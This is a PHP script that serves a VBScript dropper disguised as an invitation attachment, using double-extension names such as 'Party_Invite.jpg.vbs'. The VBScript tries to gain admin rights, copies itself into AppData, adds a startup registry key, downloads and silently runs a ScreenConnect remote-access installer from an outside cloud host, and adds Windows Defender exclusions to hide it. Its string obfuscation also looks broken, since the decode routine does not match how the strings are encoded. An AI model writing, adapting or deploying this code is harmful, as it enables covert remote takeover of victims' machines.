<?php
// invite.php - Random Invitation-Themed Filenames
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

// Random invitation-style filenames
$fakeNames = [
    "Invitation.pdf.vbs",
    "Your_Invitation.pdf.vbs",
    "Party_Invite.jpg.vbs",
    "Letter_from_Friend.docx.vbs",
    "Invitation_from_Friend.pdf.vbs",
    "Important_Mail.pdf.vbs",
    "Letter_Invite.docx.vbs"
];
$randomFilename = $fakeNames[array_rand($fakeNames)];

header('Content-Disposition: attachment; filename="' . $randomFilename . '"');

$sessionId = bin2hex(random_bytes(24));
$ts        = time();
$randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
$randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
$xorKey    = rand(100, 255);

$scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";   // CHANGE THIS

echo <<<VBS
' Windows Update Helper

Dim $randV1, objShell, objFSO
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

$randV1 = "$sessionId"

Function D(s)
    Dim i, r : r = ""
    For i = 1 To Len(s)
        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
    Next
    D = r
End Function

Function IsElevated()
    On Error Resume Next
    Dim wmi, proc
    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
    IsElevated = False ' Simplified for reliability - adjust if needed
End Function

Sub $randFunc
    On Error Resume Next
    If Not IsElevated Then Call Elevate
    Call CopySelf
    Call AddToStartup
    Call DownloadAndExecute
    Call HideAgent
End Sub

Sub Elevate()
    On Error Resume Next
    Dim fsoPath, cmd
    fsoPath = WScript.ScriptFullName
    cmd = D("dmd /c ") & """" & fsoPath & """"
    objShell.ShellExecute "cmd.exe", cmd, "", "runas", 1
    WScript.Quit
End Sub

Sub CopySelf()
    On Error Resume Next
    Dim p : p = objShell.ExpandEnvironmentStrings(D("%BQQEBUB%\\Njdsptpgu\\Xjoepxt\\VqebufIfmqfs.wct"))
    If Not objFSO.FileExists(p) Then objFSO.CopyFile WScript.ScriptFullName, p
End Sub

Sub AddToStartup()
    On Error Resume Next
    objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
        objShell.ExpandEnvironmentStrings(D("%BQQEBUB%\\Njdsptpgu\\Xjoepxt\\VqebufIfmqfs.wct")), "REG_SZ"
End Sub

Sub DownloadAndExecute()
    On Error Resume Next
    Dim u, p, http, strm
    u = "$scUrl"
    p = objShell.ExpandEnvironmentStrings(D("%UFNQ%\\xvfomqfs.fyf"))
    
    Set http = CreateObject(D("NTYNM2.YNMHTTP"))
    http.Open "GET", u, False
    http.Send
    If http.Status = 200 Then
        Set strm = CreateObject(D("BEPEC.Stream"))
        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
        objShell.Run """" & p & """ -silent", 0, True
        WScript.Sleep 5000
        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
    End If
End Sub

Sub HideAgent()
    On Error Resume Next
    objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
End Sub

Call $randFunc
WScript.Quit
VBS;
?>
